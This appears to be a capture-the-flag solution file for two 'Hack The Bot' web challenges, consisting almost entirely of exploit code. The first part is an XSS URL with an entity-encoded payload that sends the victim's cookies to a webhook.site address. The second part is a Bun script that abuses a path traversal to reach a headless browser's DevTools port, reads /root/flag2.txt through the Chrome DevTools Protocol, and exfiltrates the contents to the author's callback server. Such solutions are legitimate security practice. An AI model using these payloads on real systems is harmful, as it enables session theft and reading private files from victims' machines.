# Hack The Bot 1
```
http://localhost/?q=<iframe srcdoc="%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%26%2310%3B%26%2332%3B%26%2332%3B%26%23115%3B%26%23101%3B%26%23116%3B%26%2384%3B%26%23105%3B%26%23109%3B%26%23101%3B%26%23111%3B%26%23117%3B%26%23116%3B%26%2340%3B%26%23102%3B%26%23117%3B%26%23110%3B%26%2399%3B%26%23116%3B%26%23105%3B%26%23111%3B%26%23110%3B%26%2340%3B%26%2341%3B%26%23123%3B%26%2310%3B%26%2332%3B%26%2332%3B%26%2332%3B%26%2332%3B%26%23108%3B%26%23111%3B%26%2399%3B%26%2397%3B%26%23116%3B%26%23105%3B%26%23111%3B%26%23110%3B%26%2332%3B%26%2361%3B%26%2332%3B%26%2396%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%23115%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23119%3B%26%23101%3B%26%2398%3B%26%23104%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%2346%3B%26%23115%3B%26%23105%3B%26%23116%3B%26%23101%3B%26%2347%3B%26%2350%3B%26%2356%3B%26%2398%3B%26%2352%3B%26%2355%3B%26%2350%3B%26%2350%3B%26%2349%3B%26%2345%3B%26%2352%3B%26%2350%3B%26%2351%3B%26%2354%3B%26%2345%3B%26%2352%3B%26%2349%3B%26%2350%3B%26%2399%3B%26%2345%3B%26%2357%3B%26%2399%3B%26%2349%3B%26%2357%3B%26%2345%3B%26%23102%3B%26%2399%3B%26%2357%3B%26%2352%3B%26%2355%3B%26%2354%3B%26%2351%3B%26%2352%3B%26%2356%3B%26%2349%3B%26%2398%3B%26%2354%3B%26%2363%3B%26%23102%3B%26%2361%3B%26%2396%3B%26%2332%3B%26%2343%3B%26%2332%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2399%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%23105%3B%26%23101%3B%26%2359%3B%26%2310%3B%26%2332%3B%26%2332%3B%26%23125%3B%26%2344%3B%26%2332%3B%26%2350%3B%26%2348%3B%26%2348%3B%26%2348%3B%26%2341%3B%26%2359%3B%26%2310%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B">
```

# Hack The Bot 2

```js
// @ts-check

import { $, serve } from "bun"

const publicUrl = new URL("http://my.public.ip:25565/");
const challengeUrl = "https://hackthebot2-100459c43a199c0f.deploy.phreaks.fr/";

// Shoutout to https://github.com/aslushnikov/getting-started-with-cdp

async function getWebsocketUrl() {
    const devTools = await $`curl --path-as-is "https://hackthebot2-100459c43a199c0f.deploy.phreaks.fr/logs../browser_cache/DevToolsActivePort"`.text();
    const [port, path] = devTools.split('\n');
    const websocketUrl = `ws://localhost:${port}${path}`;
    console.log(websocketUrl);
    return websocketUrl;
}

// This is converted to a string and injected into the page, so we can't use any external variables
async function getFlag(publicUrl) {
    const websocketUrl = await fetch("/get-websocket-url").then(res => res.text());

    const devtools = new WebSocket(websocketUrl);

    let sessionId = null;

    function callback(str) {
        fetch(new URL(`/callback?${new URLSearchParams({str})}`, new URL(publicUrl)));
    }

    devtools.onopen = () => {
        callback("Opened");

        devtools.send(JSON.stringify({
            id: 1,
            method: 'Target.createTarget',
            params: {
                url: "file:///root/flag2.txt",
            },
        }));
    };

    devtools.onerror = (err) => {
        console.error('WebSocket Error: ', err);
        callback("WebSocket Error: " + err);
    }

    devtools.onmessage = (event) => {
        // const {result: {result: {value}}} = JSON.parse(data);
        // console.log('WebSocket Message Received: ', value)
        callback("<-- " + event.data);
        const obj = JSON.parse(event.data);

        if (obj.id === 1 && sessionId === null) {
            const targetId = obj.result.targetId;

            devtools.send(JSON.stringify({
                id: 2,
                method: 'Target.attachToTarget',
                params: {
                    targetId,
                    flatten: true
                }
            }));
        } else if (obj.id === 2 && sessionId === null) {
            sessionId = obj.result.sessionId;

            devtools.send(JSON.stringify({
                sessionId,
                id: 3,
                method: 'DOM.getDocument',
            }));

            devtools.send(JSON.stringify({
                sessionId,
                id: 4,
                method: 'DOM.getOuterHTML',
                params: {"nodeId":1}
            }));

            // Wait for DOM.documentUpdated
            setTimeout(() => {
                devtools.send(JSON.stringify({
                    sessionId,
                    id: 5,
                    method: 'DOM.getDocument',
                }));
                devtools.send(JSON.stringify({
                    sessionId,
                    id: 6,
                    method: 'DOM.getOuterHTML',
                    params: {"nodeId":5}
                }))
            }, 1000);
        }

    };
}


const payload = `(${getFlag.toString()})("${publicUrl}")`
// const payloadOctal = payload.split('').map(c => "\\" + c.charCodeAt(0).toString(8).padStart(3, "0")).join('')
// const html = `<input type=hidden oncontentvisibilityautostatechange="${payloadOctal}" style=content-visibility:auto>`

// Page.navigate	{"url":"file://C:/Users/Nick/Documents/ProgrammeerProjectjes/CTF/PwnMeQuals2025/web_Hack_The_bot/flag2.txt"}	
// DOM.getOuterHTML	{"nodeId":1}	


async function reportUrl(url) {
    console.log("[*]", "Reporting", url);
    
    const res = await fetch(`${challengeUrl}/report`, {
        method: "POST",
        body: new URLSearchParams({url}),
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
    })
    if (!res.ok) {
        console.error("[*]", "Failed to report", url, await res.text());
        return;
    }
    const logPath = await res.text();
    const logUrl = new URL(logPath, challengeUrl)
    console.log("[*]", logUrl.toString());

    const logRes = await fetch(logUrl);
    const logText = await logRes.text();
    console.log("[*]", logText);
}

const server = serve({
    routes: {
        "/pwn": (req, server) => {
            console.log("[*]", server.requestIP(req)?.address, req.url);
            return new Response(`
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Document</title>
                </head>
                <body>
                    Pwned
                    <script>
                        ${payload}
                    </script>
                </body>
                </html>
            `, {
                headers: {
                    "Content-Type": "text/html",
                }
            });
        },
        "/get-websocket-url": async (req, server) => {
            console.log("[*]", server.requestIP(req)?.address, req.url);
            const websocketUrl = await getWebsocketUrl();
            return new Response(websocketUrl);
        },
        "/callback": (req, server) => {
            console.log("[*]", server.requestIP(req)?.address, new URL(req.url).pathname, new URL(req.url).searchParams.get("str"));
            return new Response(`${server.requestIP(req)} ${req.url}`);
        },
    },
    port: 25565,
    hostname: "0.0.0.0",
});
console.log(`Listening on ${publicUrl}`);

reportUrl(new URL("/pwn", publicUrl).toString())
```
